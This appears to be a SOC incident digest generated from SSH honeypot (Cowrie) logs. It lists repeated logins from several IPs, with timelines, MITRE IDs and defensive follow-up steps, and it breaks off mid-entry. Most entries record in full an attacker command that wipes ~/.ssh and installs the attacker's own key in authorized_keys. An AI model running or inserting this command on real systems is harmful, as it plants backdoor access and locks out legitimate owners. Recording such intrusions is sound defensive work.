### 🔴 HIGH · IR-901eed38ce5f

| Field | Detail |
|---|---|
| **Source IP** | `103.75.183[.]177` |
| **First Seen** | 2026-06-13 22:18 |
| **Last Seen** | 2026-06-13 22:18 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-13 22:18:17` | `cowrie.session.connect` |
| `2026-06-13 22:18:17` | `cowrie.client.version` |
| `2026-06-13 22:18:17` | `cowrie.client.kex` |
| `2026-06-13 22:18:17` | `cowrie.login.success` |
| `2026-06-13 22:18:17` | `cowrie.session.params` |
| `2026-06-13 22:18:17` | `cowrie.command.input` |
| `2026-06-13 22:18:17` | `cowrie.command.failed` |
| `2026-06-13 22:18:18` | `cowrie.log.closed` |
| `2026-06-13 22:18:18` | `cowrie.session.params` |
| `2026-06-13 22:18:18` | `cowrie.command.input` |
| `2026-06-13 22:18:18` | `cowrie.session.file_download` |
| `2026-06-13 22:18:18` | `cowrie.log.closed` |
| `2026-06-13 22:18:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.75.183[.]177` to AbuseIPDB if not already reported
- [ ] Block `103.75.183[.]177` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1de863a8169f

| Field | Detail |
|---|---|
| **Source IP** | `103.75.183[.]177` |
| **First Seen** | 2026-06-13 22:18 |
| **Last Seen** | 2026-06-13 22:18 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-13 22:18:20` | `cowrie.session.connect` |
| `2026-06-13 22:18:20` | `cowrie.client.version` |
| `2026-06-13 22:18:20` | `cowrie.client.kex` |
| `2026-06-13 22:18:20` | `cowrie.login.success` |
| `2026-06-13 22:18:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.75.183[.]177` to AbuseIPDB if not already reported
- [ ] Block `103.75.183[.]177` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b6d568c12528

| Field | Detail |
|---|---|
| **Source IP** | `159.223.213[.]49` |
| **First Seen** | 2026-06-13 22:18 |
| **Last Seen** | 2026-06-13 22:18 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-13 22:18:43` | `cowrie.session.connect` |
| `2026-06-13 22:18:43` | `cowrie.client.version` |
| `2026-06-13 22:18:44` | `cowrie.client.kex` |
| `2026-06-13 22:18:44` | `cowrie.login.success` |
| `2026-06-13 22:18:45` | `cowrie.session.params` |
| `2026-06-13 22:18:45` | `cowrie.command.input` |
| `2026-06-13 22:18:45` | `cowrie.command.failed` |
| `2026-06-13 22:18:45` | `cowrie.log.closed` |
| `2026-06-13 22:18:45` | `cowrie.session.params` |
| `2026-06-13 22:18:45` | `cowrie.command.input` |
| `2026-06-13 22:18:45` | `cowrie.session.file_download` |
| `2026-06-13 22:18:45` | `cowrie.log.closed` |
| `2026-06-13 22:18:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `159.223.213[.]49` to AbuseIPDB if not already reported
- [ ] Block `159.223.213[.]49` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5ab221092395

| Field | Detail |
|---|---|
| **Source IP** | `159.223.213[.]49` |
| **First Seen** | 2026-06-13 22:18 |
| **Last Seen** | 2026-06-13 22:18 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-13 22:18:47` | `cowrie.session.connect` |
| `2026-06-13 22:18:47` | `cowrie.client.version` |
| `2026-06-13 22:18:47` | `cowrie.client.kex` |
| `2026-06-13 22:18:48` | `cowrie.login.success` |
| `2026-06-13 22:18:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `159.223.213[.]49` to AbuseIPDB if not already reported
- [ ] Block `159.223.213[.]49` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c994227be983

| Field | Detail |
|---|---|
| **Source IP** | `159.223.213[.]49` |
| **First Seen** | 2026-06-13 22:22 |
| **Last Seen** | 2026-06-13 22:22 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-13 22:22:08` | `cowrie.session.connect` |
| `2026-06-13 22:22:08` | `cowrie.client.version` |
| `2026-06-13 22:22:09` | `cowrie.client.kex` |
| `2026-06-13 22:22:09` | `cowrie.login.success` |
| `2026-06-13 22:22:09` | `cowrie.session.params` |
| `2026-06-13 22:22:09` | `cowrie.command.input` |
| `2026-06-13 22:22:09` | `cowrie.command.failed` |
| `2026-06-13 22:22:10` | `cowrie.log.closed` |
| `2026-06-13 22:22:10` | `cowrie.session.params` |
| `2026-06-13 22:22:10` | `cowrie.command.input` |
| `2026-06-13 22:22:10` | `cowrie.session.file_download` |
| `2026-06-13 22:22:10` | `cowrie.log.closed` |
| `2026-06-13 22:22:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `159.223.213[.]49` to AbuseIPDB if not already reported
- [ ] Block `159.223.213[.]49` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-37f7bb205171

| Field | Detail |
|---|---|
| **Source IP** | `159.223.213[.]49` |
| **First Seen** | 2026-06-13 22:22 |
| **Last Seen** | 2026-06-13 22:22 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-13 22:22:12` | `cowrie.session.connect` |
| `2026-06-13 22:22:12` | `cowrie.client.version` |
| `2026-06-13 22:22:12` | `cowrie.client.kex` |
| `2026-06-13 22:22:13` | `cowrie.login.success` |
| `2026-06-13 22:22:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `159.223.213[.]49` to AbuseIPDB if not already reported
- [ ] Block `159.223.213[.]49` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8d027cdfb17f

| Field | Detail |
|---|---|
| **Source IP** | `159.223.213[.]49` |
| **First Seen** | 2026-06-13 22:23 |
| **Last Seen** | 2026-06-13 22:23 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-13 22:23:52` | `cowrie.session.connect` |
| `2026-06-13 22:23:52` | `cowrie.client.version` |
| `2026-06-13 22:23:52` | `cowrie.client.kex` |
| `2026-06-13 22:23:53` | `cowrie.login.success` |
| `2026-06-13 22:23:53` | `cowrie.session.params` |
| `2026-06-13 22:23:53` | `cowrie.command.input` |
| `2026-06-13 22:23:53` | `cowrie.command.failed` |
| `2026-06-13 22:23:53` | `cowrie.log.closed` |
| `2026-06-13 22:23:53` | `cowrie.session.params` |
| `2026-06-13 22:23:53` | `cowrie.command.input` |
| `2026-06-13 22:23:54` | `cowrie.session.file_download` |
| `2026-06-13 22:23:54` | `cowrie.log.closed` |
| `2026-06-13 22:23:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `159.223.213[.]49` to AbuseIPDB if not already reported
- [ ] Block `159.223.213[.]49` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2933d7b22b56

| Field | Detail |
|---|---|
| **Source IP** | `159.223.213[.]49` |
| **First Seen** | 2026-06-13 22:23 |
| **Last Seen** | 2026-06-13 22:23 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-13 22:23:56` | `cowrie.session.connect` |
| `2026-06-13 22:23:56` | `cowrie.client.version` |
| `2026-06-13 22:23:56` | `cowrie.client.kex` |
| `2026-06-13 22:23:56` | `cowrie.login.success` |
| `2026-06-13 22:23:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `159.223.213[.]49` to AbuseIPDB if not already reported
- [ ] Block `159.223.213[.]49` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d401865d57c6

| Field | Detail |
|---|---|
| **Source IP** | `43.164.192[.]38` |
| **First Seen** | 2026-06-13 22:24 |
| **Last Seen** | 2026-06-13 22:24 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-13 22:24:47` | `cowrie.session.connect` |
| `2026-06-13 22:24:47` | `cowrie.client.version` |
| `2026-06-13 22:24:47` | `cowrie.client.kex` |
| `2026-06-13 22:24:48` | `cowrie.login.success` |
| `2026-06-13 22:24:49` | `cowrie.session.params` |
| `2026-06-13 22:24:49` | `cowrie.command.input` |
| `2026-06-13 22:24:49` | `cowrie.command.failed` |
| `2026-06-13 22:24:50` | `cowrie.log.closed` |
| `2026-06-13 22:24:51` | `cowrie.session.params` |
| `2026-06-13 22:24:51` | `cowrie.command.input` |
| `2026-06-13 22:24:51` | `cowrie.session.file_download` |
| `2026-06-13 22:24:51` | `cowrie.log.closed` |
| `2026-06-13 22:24:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.164.192[.]38` to AbuseIPDB if not already reported
- [ ] Block `43.164.192[.]38` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-65264177c148

| Field | Detail |
|---|---|
| **Source IP** | `103.75.183[.]177` |
| **First Seen** | 2026-06-13 22:24 |
| **Last Seen** | 2026-06-13 22:24 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-13 22:24:53` | `cowrie.session.connect` |
| `2026-06-13 22:24:53` | `cowrie.client.version` |
| `2026-06-13 22:24:53` | `cowrie.client.kex` |
| `2026-06-13 22:24:54` | `cowrie.login.success` |
| `2026-06-13 22:24:54` | `cowrie.session.params` |
| `2026-06-13 22:24:54` | `cowrie.command.input` |
| `2026-06-13 22:24:54` | `cowrie.command.failed` |
| `2026-06-13 22:24:54` | `cowrie.log.closed` |
| `2026-06-13 22:24:54` | `cowrie.session.params` |
| `2026-06-13 22:24:54` | `cowrie.command.input` |
| `2026-06-13 22:24:54` | `cowrie.session.file_download` |
| `2026-06-13 22:24:54` | `cowrie.log.closed` |
| `2026-06-13 22:24:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.75.183[.]177` to AbuseIPDB if not already reported
- [ ] Block `103.75.183[.]177` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-79ea3ed53c65

| Field | Detail |
|---|---|
| **Source IP** | `43.164.192[.]38` |
| **First Seen** | 2026-06-13 22:24 |
| **Last Seen** | 2026-06-13 22:24 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-13 22:24:55` | `cowrie.session.connect` |
| `2026-06-13 22:24:55` | `cowrie.client.version` |
| `2026-06-13 22:24:56` | `cowrie.client.kex` |
| `2026-06-13 22:24:57` | `cowrie.login.success` |
| `2026-06-13 22:24:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.164.192[.]38` to AbuseIPDB if not already reported
- [ ] Block `43.164.192[.]38` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-81605c79942d

| Field | Detail |
|---|---|
| **Source IP** | `103.75.183[.]177` |
| **First Seen** | 2026-06-13 22:24 |
| **Last Seen** | 2026-06-13 22:24 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-13 22:24:56` | `cowrie.session.connect` |
| `2026-06-13 22:24:56` | `cowrie.client.version` |
| `2026-06-13 22:24:56` | `cowrie.client.kex` |
| `2026-06-13 22:24:57` | `cowrie.login.success` |
| `2026-06-13 22:24:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.75.183[.]177` to AbuseIPDB if not already reported
- [ ] Block `103.75.183[.]177` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2a4962648889

| Field | Detail |
|---|---|
| **Source IP** | `43.164.192[.]38` |
| **First Seen** | 2026-06-13 22:29 |
| **Last Seen** | 2026-06-13 22:29 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-13 22:29:42` | `cowrie.session.connect` |
| `2026-06-13 22:29:42` | `cowrie.client.version` |
| `2026-06-13 22:29:43` | `cowrie.client.kex` |
| `2026-06-13 22:29:44` | `cowrie.login.success` |
| `2026-06-13 22:29:46` | `cowrie.session.params` |
| `2026-06-13 22:29:46` | `cowrie.command.input` |
| `2026-06-13 22:29:46` | `cowrie.command.failed` |
| `2026-06-13 22:29:47` | `cowrie.log.closed` |
| `2026-06-13 22:29:47` | `cowrie.session.params` |
| `2026-06-13 22:29:47` | `cowrie.command.input` |
| `2026-06-13 22:29:48` | `cowrie.session.file_download` |
| `2026-06-13 22:29:48` | `cowrie.log.closed` |
| `2026-06-13 22:29:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.164.192[.]38` to AbuseIPDB if not already reported
- [ ] Block `43.164.192[.]38` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3d46b961bad9

| Field | Detail |
|---|---|
| **Source IP** | `103.75.183[.]177` |
| **First Seen** | 2026-06-13 22:29 |
| **Last Seen** | 2026-06-13 22:29 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-13 22:29:49` | `cowrie.session.connect` |
| `2026-06-13 22:29:49` | `cowrie.client.version` |
| `2026-06-13 22:29:49` | `cowrie.client.kex` |
| `2026-06-13 22:29:49` | `cowrie.login.success` |
| `2026-06-13 22:29:50` | `cowrie.session.params` |
| `2026-06-13 22:29:50` | `cowrie.command.input` |
| `2026-06-13 22:29:50` | `cowrie.command.failed` |
| `2026-06-13 22:29:50` | `cowrie.log.closed` |
| `2026-06-13 22:29:50` | `cowrie.session.params` |
| `2026-06-13 22:29:50` | `cowrie.command.input` |
| `2026-06-13 22:29:50` | `cowrie.session.file_download` |
| `2026-06-13 22:29:50` | `cowrie.log.closed` |
| `2026-06-13 22:29:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.75.183[.]177` to AbuseIPDB if not already reported
- [ ] Block `103.75.183[.]177` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bf0f08390dba

| Field | Detail |
|---|---|
| **Source IP** | `103.75.183[.]177` |
| **First Seen** | 2026-06-13 22:29 |
| **Last Seen** | 2026-06-13 22:29 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-13 22:29:52` | `cowrie.session.connect` |
| `2026-06-13 22:29:52` | `cowrie.client.version` |
| `2026-06-13 22:29:52` | `cowrie.client.kex` |
| `2026-06-13 22:29:52` | `cowrie.login.success` |
| `2026-06-13 22:29:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.75.183[.]177` to AbuseIPDB if not already reported
- [ ] Block `103.75.183[.]177` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0a1e37e95c65

| Field | Detail |
|---|---|
| **Source IP** | `43.164.192[.]38` |
| **First Seen** | 2026-06-13 22:29 |
| **Last Seen** | 2026-06-13 22:29 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-13 22:29:52` | `cowrie.session.connect` |
| `2026-06-13 22:29:52` | `cowrie.client.version` |
| `2026-06-13 22:29:52` | `cowrie.client.kex` |
| `2026-06-13 22:29:54` | `cowrie.login.success` |
| `2026-06-13 22:29:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.164.192[.]38` to AbuseIPDB if not already reported
- [ ] Block `43.164.192[.]38` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-720100e67ddc

| Field | Detail |
|---|---|
| **Source IP** | `107.189.27[.]179` |
| **First Seen** | 2026-06-13 22:30 |
| **Last Seen** | 2026-06-13 22:30 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-13 22:30:28` | `cowrie.session.connect` |
